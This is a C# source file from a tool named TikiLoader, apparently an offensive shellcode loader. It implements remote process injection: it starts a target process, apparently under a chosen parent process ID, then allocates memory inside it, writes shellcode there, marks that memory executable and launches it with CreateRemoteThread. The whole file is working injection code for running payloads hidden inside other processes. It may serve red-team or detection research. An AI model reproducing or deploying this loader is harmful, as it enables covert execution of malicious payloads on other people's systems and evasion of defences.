using System;

using static TikiLoader.Generic;
using static TikiLoader.Imports;
using static TikiLoader.Enums;

namespace TikiLoader
{
    public class Injector
    {
        private static IntPtr AllocateVirtualMemory(IntPtr hProcess, uint length)
        {
            return VirtualAllocEx(hProcess, IntPtr.Zero, length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
        }

        private static bool WriteShellcode(IntPtr hProcess, IntPtr baseAddr, byte[] shellcode)
        {
            IntPtr written;
            return WriteProcessMemory(hProcess, baseAddr, shellcode, shellcode.Length, out written);
        }

        private static bool ChangeVirtualMemory(IntPtr hProcess, IntPtr baseAddr, IntPtr shellcodeLength)
        {
            MemoryProtection oldProtect;
            return VirtualProtectEx(hProcess, baseAddr, shellcodeLength, MemoryProtection.ExecuteRead, out oldProtect);
        }

        private static IntPtr ResumeProcess(IntPtr hProcess, IntPtr baseAddr)
        {
            IntPtr threadId;
            return CreateRemoteThread(hProcess, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out threadId);
        }

        public static void CRTInject(string binary, byte[] shellcode, int ppid)
        {
            var pinf = StartProcess(binary, ppid);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            ResumeProcess(pinf.hProcess, baseAddr);
        }
    }
}